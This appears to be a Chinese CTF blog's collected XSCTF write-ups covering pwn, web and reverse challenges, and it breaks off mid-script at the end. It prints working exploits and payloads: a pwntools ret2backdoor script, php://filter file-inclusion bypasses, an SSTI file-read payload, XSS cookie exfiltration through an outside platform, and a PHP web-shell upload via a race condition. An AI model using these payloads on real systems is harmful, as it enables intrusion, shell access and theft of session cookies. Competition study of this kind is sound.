o.O o.Ö Ö.0 o.0 ovO o.Ö Ö.o 0vo Ow0 Ö.Ö owo 0_0 0.0 o.Ö Ö.O O.0 O_0 o_O 0vÖ owo 尊嘟假嘟O.o (zdjd.vercel.app) 解密之后凯撒爆破 XSCTF&#123;gr3at_y0u_aRe_reA1_CaesAr&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"XSCTF_warmup","slug":"xsctf_warmup","date":"2024-11-04T15:29:52.430Z","updated":"2024-11-09T19:28:26.494Z","comments":true,"path":"2024/11/04/xsctf_warmup/","link":"","permalink":"http://uniqueland.top/2024/11/04/xsctf_warmup/","excerpt":"","text":"babystack附件：babystack 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [rsp+Eh] [rbp-2h] init_func(argc, argv, envp); start_show(); puts(&amp;s); __isoc99_scanf(v4); vuln(v4); return 0;&#125;ssize_t __fastcall vuln(unsigned int a1)&#123; char buf[80]; // [rsp+10h] [rbp-50h] BYREF if ( a1 &lt;= 0x7FFFFFFE ) &#123; printf(format); exit(0); &#125; puts(&amp;byte_402038); puts(&amp;byte_40205D); return read(0, buf, 0x8848uLL);&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125; 对于第一个比较，直接输入-1 对于read函数，输入80+8个字符之后再输入需要返回的地址（backdoor）即可 exp 12345678910111213from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)sysaddr = elf.symbols[&#x27;backdoor&#x27;]print(&#x27;0x%x&#x27;%sysaddr)r.recv()r.sendline(b&#x27;-1&#x27;)r.recv()r.sendline(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(sysaddr))r.interactive() 正常来说这么写没问题，但是运行的时候不会返回shell原因估计是堆栈平衡之类的问题，解决的方法是直接返回到调用system函数的地址，跳过栈操作 exp 1234567891011from pwn import *r = remote(&#x27;43.248.97.213&#x27;, 40054)elf = ELF(&#x27;./babystack&#x27;)r.recv()r.sendline(b&#x27;-1&#x27;)sleep(2)r.send(b&#x27;a&#x27;*80 + b&#x27;b&#x27;*8 + p64(0x4012bf))r.interactive() 坑 当返回到后门函数行不通的时候，返回到调用system函数的语句 Windows和Linux平台运行同一份exp的结果可能不同 XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125; Badbad_filenameGET me a filename and I&#39;ll include it!测试一下发现过滤了php、filter、base、data、file等关键字然后就搜一堆绕过的方法 如果base被绕过了，可以使用url编码convert往后，resource往前的字符?filename=pHp://filtEr/convert.%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565/resource= 除了测试文件/etc/passwd之外，如果是nginx，可以考虑读日志/var/log/nginx/access.log 如果读flag.php，记得先访问一下看看页面是否存在 最后，这道题的解法是最简单的双写绕过?filename=pphphp://filfilterter/convert.basbasee64-encode/resource=flag.pphphp XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125; 麻了 canyoupassit1234567891011121314151617181920&lt;?php highlight_file(__FILE__); error_reporting(0); if ($_POST[&#x27;a1&#x27;] != $_POST[&#x27;b1&#x27;] &amp;&amp; md5($_POST[&#x27;a1&#x27;] == md5($_POST[&#x27;b1&#x27;])))&#123; echo &quot;恭喜你过了第一关!&quot;; &#125; else &#123; die(&quot;就这?&quot;); &#125; if ($_POST[&#x27;key&#x27;] == md5($_POST[&#x27;key&#x27;])) &#123; echo &quot;恭喜你过了第二关!&quot;; &#125; else &#123; die(&quot;再看看?&quot;); &#125; $now = time(); if ($_POST[&#x27;a2&#x27;] != $_POST[&#x27;b2&#x27;] &amp;&amp; str_starts_with($_POST[&#x27;a2&#x27;], $now) &amp;&amp; str_starts_with($_POST[&#x27;b2&#x27;], $now) &amp;&amp; md5($_POST[&#x27;a2&#x27;] === md5($_POST[&#x27;b2&#x27;])))&#123; echo &quot;恭喜你过了第三关!&quot;; include &quot;/flag&quot;; &#125; else &#123; die(&quot;真可惜，就差最后一步了&quot;); &#125; 这是一道有关md5绕过的题目，主要分为三个部分 不同值的变量，md5的值是一样的（弱比较） – md5弱碰撞 md5值等于自身的值（弱比较） – 0e绕过 不同值的md5是一样的（强比较），且要求两个值都有特定前缀 解决的方法如下： 对于弱比较的md5值，可以直接百度特定的值 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等 对于若比较的$a == md5($a)，存在0e开头的值md5之后还是0e开头，这样在弱比较中仍然相等，如0e215962017 对于强比较，可以采用md5强碰撞的方式，网上有特定的值可以满足值不同但是md5值相同，但是这里存在另外一个问题，就是这两个值的前缀必须是当前时间，这就需要自己生成特定的两个值，使用fastcoll工具，可以生成特定前缀的值来满足条件，这个特定前缀就是当前时间 1234567891011121314151617181920212223242526272829import requestsimport osimport timet = int(time.time()+10)with open(&#x27;t.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(t))os.system(&quot;fastcoll_v1.0.0.5.exe t.txt&quot;)a2 = open(&#x27;t_msg1.txt&#x27;, &#x27;rb&#x27;).read()b2 = open(&#x27;t_msg2.txt&#x27;, &#x27;rb&#x27;).read()url = &quot;http://43.248.97.213:30038/&quot;data = &#123; &#x27;a1&#x27;: &#x27;s214587387a&#x27;, &#x27;b1&#x27;: &#x27;s155964671a&#x27;, &#x27;key&#x27; : &#x27;0e215962017&#x27;, &#x27;a2&#x27;: a2, &#x27;b2&#x27;: b2,&#125;while 1: res = requests.post(url, data=data) if &#x27;flag&#123;&#x27; in res.text: print(res.text) break 一些要注意的点 特定前缀的时间最好往后调一调，避免因网络问题导致错过时间 生成的两个txt需要以二进制的形式读取 flag&#123;y0v|nDeedReA11yk$nwAb0uTMD5!~_~^_^&#125; Ezgame进入是一个小游戏，要求达到非常高的分数 直接玩肯定不现实，于是翻翻js代码因为不是通过php记录分数的，所以不可以使用POST请求之类的修改分数 入手的思路是通过浏览器控制台访问所有的对象，然后找到存储分数的变量，直接在控制台修改变量翻了十几份代码之后去控制台查看对象，从全局对象入手，最终找到了这些 看起来像是存储游戏角色的变量于是直接修改其中的gold和kills以及high_score（不知道改哪个，干脆全改了) 1&#123;&quot;id&quot;:&quot;o1&quot;,&quot;ownerId&quot;:null,&quot;position&quot;:&#123;&quot;x&quot;:359.04999999999956,&quot;y&quot;:154.2499999999999&#125;,&quot;size&quot;:&#123;&quot;width&quot;:32,&quot;height&quot;:32&#125;,&quot;direction&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;facing&quot;:&#123;&quot;x&quot;:-1,&quot;y&quot;:0&#125;,&quot;speed&quot;:150,&quot;team&quot;:0,&quot;hitPoints&quot;:100,&quot;damage&quot;:0,&quot;spriteSheet&quot;:&quot;characters&quot;,&quot;spriteX&quot;:0,&quot;spriteY&quot;:992,&quot;spriteAlign&quot;:false,&quot;animated&quot;:true,&quot;animFrameIndex&quot;:0,&quot;animNumFrames&quot;:2,&quot;animDelay&quot;:200,&quot;animElapsed&quot;:16,&quot;spawnFrameIndex&quot;:0,&quot;spawnFrameCount&quot;:2,&quot;spawnFramesX&quot;:0,&quot;spawnFramesY&quot;:0,&quot;angle&quot;:0,&quot;rotateSpeed&quot;:400,&quot;rotate&quot;:false,&quot;worth&quot;:0,&quot;ttl&quot;:0,&quot;ttlElapsed&quot;:0,&quot;alpha&quot;:1,&quot;alphaMod&quot;:-1,&quot;gibletSize&quot;:&quot;small&quot;,&quot;cooldown&quot;:false,&quot;cooldownElapsed&quot;:0,&quot;autoFire&quot;:false,&quot;soundAttacks&quot;:&quot;hero_attacks&quot;,&quot;soundDamage&quot;:&quot;hero_damage&quot;,&quot;soundDies&quot;:&quot;hero_dies&quot;,&quot;alive&quot;:true,&quot;states&quot;:[&#123;&quot;type&quot;:0,&quot;timer&quot;:&#123;&quot;elapsed_ms&quot;:43298,&quot;ttl&quot;:0&#125;&#125;,null,null],&quot;currentWeaponIndex&quot;:1,&quot;collidable&quot;:true,&quot;bounce&quot;:true,&quot;piercing&quot;:false,&quot;achievementId&quot;:null,&quot;deathsForAchievement&quot;:null,&quot;ignoreLogDeath&quot;:false,&quot;damageType&quot;:null,&quot;drawIndex&quot;:1,&quot;moveChangeElapsed&quot;:0,&quot;moveChangeDelay&quot;:500,&quot;wounds&quot;:15,&quot;weapons&quot;:[&#123;&quot;type&quot;:&quot;h_sword&quot;,&quot;count&quot;:null&#125;,&#123;&quot;type&quot;:&quot;h_spear&quot;,&quot;count&quot;:82&#125;],&quot;gold&quot;:1000000000,&quot;kills&quot;:10000000000,&quot;timesWounded&quot;:1,&quot;totalDamageTaken&quot;:15,&quot;shotsFired&quot;:108,&quot;shotsLanded&quot;:65,&quot;shotsPerWeapon&quot;:&#123;&quot;h_sword&quot;:28,&quot;h_knife&quot;:31,&quot;h_spear&quot;:18&#125;,&quot;meatEaten&quot;:0,&quot;cheater&quot;:false,&quot;phase&quot;:0,&quot;phaseInit&quot;:false,&quot;lootTable&quot;:[],&quot;killSwitch&quot;:false,&quot;type&quot;:&quot;hero&quot;,&quot;role&quot;:&quot;hero&quot;,&quot;isMeatboy&quot;:false,&quot;bloodTimer&quot;:null&#125; 然后返回游戏发现数据没有变化以为错了，退出去，然后在主界面发现了flag flag&#123;basju_D0G006706_iajdisaia&#125; hardphp进入题目什么都没有，只有一句话尝试大声喊出v我50!!!我就会给你flag只能扫后台了 12345678910111213141516171819202122232425262728293031323334353637~$ dirsearch -u http://43.248.97.213:30090/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txtError Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.logTarget: http://43.248.97.213:30090/[22:14:33] Starting:[22:14:37] 403 - 223B - /.htaccess.orig[22:14:37] 403 - 225B - /.htaccess.sample[22:14:37] 403 - 223B - /.htaccess.bak1[22:14:37] 403 - 220B - /.ht_wsr.txt[22:14:37] 403 - 223B - /.htaccess.save[22:14:37] 403 - 224B - /.htaccess_extra[22:14:38] 403 - 221B - /.htaccess_sc[22:14:38] 403 - 223B - /.htaccess_orig[22:14:38] 403 - 214B - /.html[22:14:38] 403 - 219B - /.htpasswds[22:14:38] 403 - 221B - /.htaccessBAK[22:14:38] 403 - 221B - /.htaccessOLD[22:14:38] 403 - 213B - /.htm[22:14:38] 403 - 222B - /.htaccessOLD2[22:14:38] 403 - 220B - /.httr-oauth[22:14:38] 403 - 223B - /.htpasswd_test[22:15:05] 200 - 304B - /index.php[22:15:05] 200 - 304B - /index.php/login/[22:15:17] 403 - 222B - /server-status[22:15:17] 403 - 223B - /server-status/[22:15:25] 200 - 825B - /www.zipTask Completed 扫出来三个，其中www.zip是网站的备份解压之后发现有个flagflaghhh.php 12345678910111213141516&lt;?php error_reporting(0); highlight_file(__FILE__); $input = $_POST[&#x27;a&#x27;]; if (isset($input)) &#123; if (substr($input, 0, 5) == &quot;vme50&quot; and substr($input, -1, 1) == &quot;!&quot;) &#123; if ($input == &quot;vme50!&quot;) &#123; die(&quot;Speak a little louder, I can&#x27;t hear you!&quot;); &#125; if (preg_match(&#x27;/vme50.+?!/is&#x27;, $input)) &#123; die(&quot;xing bu xing a.Speak much louder!&quot;); &#125; system(&quot;cat /flag&quot;); &#125; else echo &quot;Bie lai zhan bian!!!&quot;; &#125; 对传入的a参数有三个条件 以vme50为开头，以感叹号为末尾 不可以是vme50 不可以满足正则表达式/vme50.+?!/is，该正则表达式的意思是匹配以vme50开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败 /：正则表达式的开始和结束标记。 vme50：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。 .：点号（.）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。 +：加号（+）表示前面的字符（在这个例子中是点号 .）出现一次或多次。 ?：问号（?）在这里与 + 结合使用，表示前面的字符（点号 .）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。 !：感叹号（!）在这里是一个普通字符，表示匹配文本中包含 ! 的部分。 /is：这是正则表达式的修饰符部分，i 表示不区分大小写，s 表示点号 . 可以匹配任意字符，包括换行符。 仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万所以 1234567891011import requestsurl = &quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;data = &#123; #&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100 &#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;0&#x27;*1000000+&#x27;!&#x27;&#125;res = requests.post(url=url, data=data)print(res.text) flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125; KFC 主要考点：HTTP header各字段的含义及格式 进入题目连接，除了一张无意义的图片之外就是Are you come from localhost?猜测修改XFF，即X-Forwarded-For: 127.0.0.1 发包返回Are you jump from KFC&#39;s website?(http:****.cn)猜测修改Referer，搜索kfc的网址https://kfcapp.cn/，即Referer: https://kfcapp.cn/ 发包返回Have you v me 50?这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段 123456789101112HTTP&#x2F;1.1 200 OKDate: Sat, 26 Oct 2024 17:57:44 GMTServer: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45X-Powered-By: PHP&#x2F;5.4.45money: 0Vary: Accept-EncodingContent-Length: 106Keep-Alive: timeout&#x3D;5, max&#x3D;100Connection: Keep-AliveContent-Type: text&#x2F;html&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50? 故猜测在header增加一个money的字段，值为50，即money: 50 flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; kk园区审核员善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！ 填表 - 提交 - 审核cookie猜测是xss cookie外带 找xss平台 复制payload并填表 提交并返回xss平台看记录 XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com) reallyExpensive给了十块钱的余额要买好贵的flag抓包改购买的数目 flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125; upload_quick进入页面什么也干不了，没有找到文件上传的路径文件上传的页面藏在js文件里 根据题目猜测条件竞争 123456789101112131415161718192021222324252627POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1Host: 43.248.97.213:30014Content-Length: 331Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0Origin: http:&#x2F;&#x2F;43.248.97.213:30014Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcSAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242Connection: keep-alive------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;Content-Type: application&#x2F;octet-stream&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;------WebKitFormBoundaryY7TKFDA8ZwPEXpcSContent-Disposition: form-data; name&#x3D;&quot;submit&quot;ä¸ä¼ ------WebKitFormBoundaryY7TKFDA8ZwPEXpcS-- 重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了 flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125; 你买车票没题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）每次提交都会弹窗xxx,没买车票不能上车!!!但是在返回的页面中并没有看到js代码或者请求的js文件 一开始以为是使用php动态生成的js代码，但是没有思路后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用&#123;&#123; 4-1 &#125;&#125;这样的输入测试，如果返回3就说明存在ssti模板注入 确定了存在模板注入之后，还要确定怎么写payloadflask之ssti模版注入从零到入门 - 先知社区 (aliyun.com) payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数这里使用的payload：&#123;&#123;\"\".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,\"/flag\")&#125;&#125; 一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是FileLoader XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125; 隐秘的backdoor12345678910&lt;?php error_reporting(0); highlight_file(__FILE__); $cmd = $_POST[&#x27;cmd&#x27;]; if(isset($_POST[&#x27;cmd&#x27;]))&#123; phpinfo(); die(&quot;不要这样！TuT&quot;); &#125; else &#123; $cmd = $_POST[&#x27;cmd&#x27;]; eval($cmd); &#125; ?&gt; 查询了很多绕过的方式，还是不行然后看了看php的版本，查到了这个版本的漏洞 具体上网搜 flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125; calculate查壳，发现upx，upx.exe -d calculate.exe然后扔进ida，发现这么一个函数 百度下叫约束求解（看起来有点像矩阵运算）1000多行手工提取不实际，写个脚本处理下 1234567891011121314151617with open(&#x27;asd.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()tmp = &#x27;&#x27;final = []for i in content: if &quot;return 0i64;&quot; not in i: tmp += i.strip() else: final.append(tmp) tmp = &#x27;&#x27;print(final)with open(&#x27;tmp1.txt&#x27;, &#x27;w&#x27;) as f: for i in final: f.write(i+&#x27;\\n&#x27;) 初步处理之后手动删去前后缀，就得到了公式（字符串版） 然后使用python中一个叫z3的库，专门用来求解这种方程组其中有一个方法可以将字符串版的方程转换为python可以处理的表达式 以下是一个模板 1234567891011121314151617181920212223242526from z3 import * def solver_eng(fc): # 创建解释器对象 solver = Solver() # 添加约束方程 for i in range(len(fc)): solver.add(eval(fc[i])) #eval函数会将字符串形式的方程转换为z3模块能解析的方程 # 求解并转化为字符输出，得到flag if solver.check() == sat: # check()方法用来判断是否有解，sat(即satisify)表示满足有解 ans = solver.model() # model()方法得到解 for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) # 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误 else: print(&quot;no ans!&quot;) if __name__ == &#x27;__main__&#x27;: # 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了） fc = [] # 创建未知数变量 v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) 根据题目修改一下 12345678910111213141516171819202122232425from z3 import *with open(&#x27;tmp1.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines()def solver_eng(fc): solver = Solver() for i in range(len(fc)): solver.add(eval(fc[i])) if solver.check() == sat: ans = solver.model() for i in v: print(chr(ans[i].as_long()), end=&#x27;&#x27;) else: print(&#x27;Error&#x27;)if __name__ == &#x27;__main__&#x27;: fc = [] for i in content: fc.append(i.strip()) v = [Int(f&#x27;v&#123;i&#125;&#x27;) for i in range(0, len(fc))] solver_eng(fc) flag&#123;n0w_y0u_know_UPX!&#125; z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客 call_above_call核心代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// bad sp value at call has been detected, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-14h] [ebp-90h] int v5; // [esp-10h] [ebp-8Ch] int v6; // [esp-Ch] [ebp-88h] int v7; // [esp-8h] [ebp-84h] int v8; // [esp-4h] [ebp-80h] int v9; // [esp+0h] [ebp-7Ch] int v10; // [esp+4h] [ebp-78h] int i; // [esp+4h] [ebp-78h] int v12; // [esp+8h] [ebp-74h] char s[100]; // [esp+Ch] [ebp-70h] BYREF unsigned int v14; // [esp+70h] [ebp-Ch] int *p_argc; // [esp+74h] [ebp-8h] p_argc = &amp;argc; v14 = __readgsdword(0x14u); v12 = generate(); printf(&quot;input your key:&quot;); ((void (__stdcall *)(const char *, char *, int, int, int, int, int, int, int, int))__isoc99_scanf)( &quot;%s&quot;, s, v4, v5, v6, v7, v8, 1, v10, v12); if ( strlen(s) != 25 ) &#123; printf(&quot;Sorry!&quot;); exit(0); &#125; wuhuwuhu((int)s); for ( i = 0; i &lt;= 24; ++i ) &#123; if ( s[i] != *(_BYTE *)(enc + i) ) &#123; v9 = 0; break; &#125; &#125; if ( v9 ) printf(&quot;Congratulations!&quot;); else printf(&quot;try again!&quot;); end_m(p_argc); return 0;&#125; 12345678int __cdecl wuhuwuhu(int a1)&#123; int i; // [esp+8h] [ebp-Ch] for ( i = 0; i &lt;= 23; ++i ) *(_BYTE *)(i + a1) ^= *(_BYTE *)(i + 1 + a1); return a1;&#125; 主要逻辑：接收输入然后循环异或输入（元素1和元素2异或的结果替换元素1），然后和目标数组比较，但是目标数组是动态的，因此需要动态调试拿到目标数组后反过来异或就可以了 exp 1234567s = [0x0A, 0x0D, 0x06, 0x1C, 0x4B, 0x49, 0x17, 0x5A, 0x59, 0x04, 0x0A, 0x3C, 0x3B, 0x57, 0x51, 0x17, 0x12, 0x38, 0x26, 0x00, 0x1D, 0x17, 0x52, 0x5C, 0x7D]for i in range(len(s)): s[len(s)-2-i] = s[len(s)-2-i] ^ s[len(s)-1-i]for i in s: print(chr(i), end=&#x27;&#x27;) flag&#123;0yn4mic_d3bug_yyds!&#125; cube3题目描述 你玩过三阶魔方吗,你能看懂R U R’ U’这样的公式吗,这里有4个魔方等你来还原 公式(步骤)格式例如R U’ R U R U R U’ R’ U’ R2’ &lt;回车&gt;,每步操作用空格分开,逆时针加上’字符 flag格式为xsctf{formula},其中formula为4个魔方的还原步骤依次连在一起,去掉空格,取其md5 本题在Ubuntu22下编译,请不要使用ubuntu18 6个面，一共24种旋转操作，分析时需要对号入座 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+Bh] [rbp-3B5h] int v5; // [rsp+Ch] [rbp-3B4h] char v6[160]; // [rsp+10h] [rbp-3B0h] BYREF int v7[40]; // [rsp+B0h] [rbp-310h] BYREF char v8[160]; // [rsp+150h] [rbp-270h] BYREF int v9[114]; // [rsp+1F0h] [rbp-1D0h] BYREF unsigned __int64 v10; // [rsp+3B8h] [rbp-8h] v10 = __readfsqword(0x28u); cube_init((__int64)v9); print_menu(v9, argv); v4 = getchar(); getchar(); if ( v4 &lt;= &#x27;0&#x27; || v4 &gt; 52 ) &#123; if ( v4 == 53 ) puts(&quot;bye!&quot;); else puts(&quot;error!&quot;); &#125; else &#123; formula_get_by_id((__int64)v6, v4 - 48); cube_scramble((__int64)v9, (__int64)v6); cube_print((unsigned int *)v9); v5 = 0; formula_input((char *)v7); while ( v7[v5] != 24 ) cube_rotating((__int64)v9, v7[v5++]); cube_print((unsigned int *)v9); formula_reverse(v7, v8); if ( !(unsigned int)cube_isorigin(v9) || (unsigned int)formula_cmp(v6, v8) ) &#123; if ( (unsigned int)cube_isorigin(v9) &amp;&amp; (unsigned int)formula_cmp(v6, v8) ) puts(&quot;Restore successfully!!!But not reverse!!!&quot;); else puts(&quot;Restore failed!!!&quot;); &#125; else &#123; puts(&quot;Restore successfully!!!You reversed the formula!!!&quot;); &#125; &#125; printf(&quot;press anykey to continue...&quot;); getchar(); return 0;&#125; 运行是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041~$ .&#x2F;cube3 三阶魔方 _______________________________________________ | | | 请输入编号: | | 1.打乱1 2.打乱2 | | 3.打乱3 4.打乱4 | | 5.退出程序 | | | | | ----------------------------------------------- 请输入编号[1&#x2F;2]:4 ________________ | 2 | 3 | 3 | +----+----+----+ | 2 | 4 | 4 | +----+----+----+ | 5 | 3 | 6 | +----+----+----+ &#x2F; 4 &#x2F; 5 &#x2F; 1 &#x2F;| &#x2F;____&#x2F;____&#x2F;____&#x2F; | &#x2F; 1 &#x2F; 1 &#x2F; 6 &#x2F;|3+ &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;| &#x2F; 3 &#x2F; 5 &#x2F; 1 &#x2F;|1|1| ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;| | 1 | 5 | 5 | 2 | 4 | 6 |&#x2F;|6+1| +---+----+----+----+----+----+6|&#x2F;|&#x2F; | 5 | 5 | 2 | 6 | 3 | 3 |&#x2F;|6+ +---+----+----+----+----+----+2|&#x2F; | 6 | 2 | 3 | 6 | 3 | 5 |&#x2F; +---+----+----+----+----+----+ | 2 | 1 | 4 | +----+----+----+ | 4 | 2 | 4 | +----+----+----+ | 4 | 2 | 5 | +----+----+----+Enter a formula and separate each step with a spaceTip: The format of the operation is like R2 R2&#39; R[&#39;] represents a counterclockwise rotation&gt;&gt;&gt; 需要输入魔方的公式【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com) 要还原魔方，最简单的方法是反着拧要反着拧，就要找到打乱的顺序 ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596unsigned __int64 __fastcall formula_get_by_id(__int64 a1, int a2)&#123; int i; // [rsp+1Ch] [rbp-294h] int v4[162]; // [rsp+20h] [rbp-290h] BYREF unsigned __int64 v5; // [rsp+2A8h] [rbp-8h] v5 = __readfsqword(0x28u); memset(v4, 0, 0x280uLL); v4[0] = 23; v4[1] = 3; v4[2] = 4; v4[3] = 8; v4[4] = 18; v4[5] = 9; v4[6] = 12; v4[7] = 18; v4[8] = 13; v4[9] = 7; v4[10] = 20; v4[11] = 11; v4[12] = 13; v4[13] = 22; v4[14] = 14; v4[15] = 6; v4[16] = 8; v4[17] = 18; v4[18] = 4; v4[19] = 14; v4[20] = 24; v4[40] = 6; v4[41] = 22; v4[42] = 7; v4[43] = 13; v4[44] = 1; v4[45] = 4; v4[46] = 2; v4[47] = 8; v4[48] = 22; v4[49] = 19; v4[50] = 6; v4[51] = 10; v4[52] = 19; v4[53] = 21; v4[54] = 19; v4[55] = 7; v4[56] = 17; v4[57] = 8; v4[58] = 7; v4[59] = 12; v4[60] = 24; v4[80] = 5; v4[81] = 15; v4[82] = 19; v4[83] = 2; v4[84] = 5; v4[85] = 17; v4[86] = 12; v4[87] = 9; v4[88] = 7; v4[89] = 12; v4[90] = 18; v4[91] = 5; v4[92] = 12; v4[93] = 3; v4[94] = 11; v4[95] = 14; v4[96] = 5; v4[97] = 18; v4[98] = 6; v4[99] = 22; v4[100] = 24; v4[120] = 20; v4[121] = 12; v4[122] = 7; v4[123] = 21; v4[124] = 14; v4[125] = 23; v4[126] = 19; v4[127] = 13; v4[128] = 3; v4[129] = 18; v4[130] = 7; v4[131] = 3; v4[132] = 0x16; v4[134] = 8; v4[135] = 1; v4[136] = 0x12; v4[137] = 7; v4[138] = 0x12; v4[139] = 0xB; v4[140] = 0x18; for ( i = 0; v4[40 * a2 - 40 + i] != 24; ++i ) *(_DWORD *)(a1 + 4LL * i) = v4[40 * a2 - 40 + i]; *(_DWORD *)(4LL * i + a1) = 24; return v5 - __readfsqword(0x28u);&#125; 因为题目说一共有24种操作，刚好是v4元素的取值范围-1减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方 因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849s = open(&#x27;./tmp.txt&#x27;, &#x27;r&#x27;).readlines()print(len(s))ss = []for i in s: num = &#x27;&#x27; for j in range(len(i)): if i[j] == &#x27;=&#x27;: num = i[j+1:-2] ss.append(int(num))rotate = [ &#x27;U&#x27;, &#x27;U\\&#x27;&#x27;, &#x27;U2&#x27;, &#x27;U2\\&#x27;&#x27;, &#x27;D&#x27;, &#x27;D\\&#x27;&#x27;, &#x27;D2&#x27;, &#x27;D2\\&#x27;&#x27;, &#x27;F&#x27;, &#x27;F\\&#x27;&#x27;, &#x27;F2&#x27;, &#x27;F2\\&#x27;&#x27;, &#x27;B&#x27;, &#x27;B\\&#x27;&#x27;, &#x27;B2&#x27;, &#x27;B2\\&#x27;&#x27;, &#x27;L&#x27;, &#x27;L\\&#x27;&#x27;, &#x27;L2&#x27;, &#x27;L2\\&#x27;&#x27;, &#x27;R&#x27;, &#x27;R\\&#x27;&#x27;, &#x27;R2&#x27;, &#x27;R2\\&#x27;&#x27;]for i in ss: if i == 24: print() else: print(rotate[i], end=&#x27; &#x27;)for i in range(len(ss)-1, -1, -1): if ss[i] == 24: print() else: if 